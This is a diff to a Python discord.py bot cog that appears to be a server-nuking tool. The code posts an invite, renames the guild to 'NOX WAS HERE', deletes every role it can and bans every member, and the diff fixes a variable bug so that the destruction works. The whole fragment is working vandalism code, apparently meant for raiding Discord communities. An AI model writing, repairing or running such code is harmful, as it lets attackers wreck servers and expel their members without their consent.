@@ -22,13 +22,13 @@ class Startup(commands.Cog):
                 print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Invite: {str(invite)} :)')
                 await ctx.guild.edit(name="NOX WAS HERE")
                 print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Changed server name :)')
-                for c in guild.roles:
+                for c in ctx.guild.roles:
                     try:
                         await c.delete()
-                        print(f'Guild: {guild.name} - {str(guild.id)} - Deleted role: {c.name}')
+                        print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Deleted role: {c.name}')
                     except discord.errors.HTTPException:
                         pass
-                print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all possible roles :)')
+                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Deleted all possible roles :)')
                 for member in ctx.guild.members:
                     try:
                         await member.ban(reason='Banned by Anix <3')
